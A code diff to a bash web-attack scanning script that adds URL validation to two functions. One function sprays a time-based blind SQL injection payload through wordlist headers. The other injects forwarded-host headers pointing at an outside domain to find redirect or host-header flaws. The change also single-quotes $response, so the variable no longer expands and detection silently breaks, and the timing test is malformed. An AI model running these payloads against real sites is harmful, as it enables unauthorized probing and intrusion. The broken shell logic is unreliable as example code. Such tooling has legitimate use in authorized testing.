@@ -218,15 +218,19 @@ checkheadersforsqli(){
 	fi
 	touch $2
 	cat $1 | while read url; do
-		cat ~/tools/__diccionarios/headers.txt | while read head; do
-			response=$(curl -X GET -H 'User-Agent:' -H "$head: \"XOR(if(now()=sysdate(),sleep(6),0))OR\"" -s -I -L -w "REQUESTTIME %{time_starttransfer}" $url)
-			time=$(echo $response | tail -1)
-			if [$time -gt 6]
-			then
-				echo "\r\n*** URL: $url - Header: $head\r\n" >> $2
-				echo $response >> $2
-			fi
-		done
+		regex='(https?)://[-A-Za-z0-9\+&@#/%?=~_|!:,.;]*[-A-Za-z0-9\+&@#/%=~_|]'
+		if [[ $url =~ $regex ]]
+		then 
+			cat ~/tools/__diccionarios/headers.txt | while read head; do
+				response=$(curl -X GET -H 'User-Agent:' -H "$head: \"XOR(if(now()=sysdate(),sleep(6),0))OR\"" -s -I -L -w "REQUESTTIME %{time_starttransfer}" $url)
+				time=$(echo '$response' | tail -1)
+				if [$time -gt 6]
+				then
+					echo "\r\n*** URL: $url - Header: $head\r\n" >> $2
+					echo '$response' >> $2
+				fi
+			done
+		fi
 	done
 }
 
@@ -241,10 +245,14 @@ checkheadersforredirect(){
 	fi
 	touch $2
 	cat $1 | while read url; do
-		response=$(curl -X GET -H "X-Forwarded-For: estebancano.com.ar/abc.php?$url" -s -L $url)
-		grep -q '<!-- CHECK -->' <<< $response && echo "\r\n*** URL: $url - Header: X-Forwarded-For: estebancano.com.ar/abc.php?$url" >> $2
-		response=$(curl -X GET -H "X-Forwarded-Host: estebancano.com.ar/abc.php?$url" -s -L $url)
-		grep -q '<!-- CHECK -->' <<< $response && echo "\r\n*** URL: $url - Header: X-Forwarded-For: estebancano.com.ar/abc.php?$url" >> $2
+		regex='(https?)://[-A-Za-z0-9\+&@#/%?=~_|!:,.;]*[-A-Za-z0-9\+&@#/%=~_|]'
+		if [[ $url =~ $regex ]]
+		then 
+			response=$(curl -X GET -H "X-Forwarded-For: estebancano.com.ar/abc.php?$url" -s -L $url)
+			grep -q '<!-- CHECK -->' <<< '$response' && echo "\r\n*** URL: $url - Header: X-Forwarded-For: estebancano.com.ar/abc.php?$url" >> $2
+			response=$(curl -X GET -H "X-Forwarded-Host: estebancano.com.ar/abc.php?$url" -s -L $url)
+			grep -q '<!-- CHECK -->' <<< '$response' && echo "\r\n*** URL: $url - Header: X-Forwarded-For: estebancano.com.ar/abc.php?$url" >> $2
+		fi
 	done
 }
 
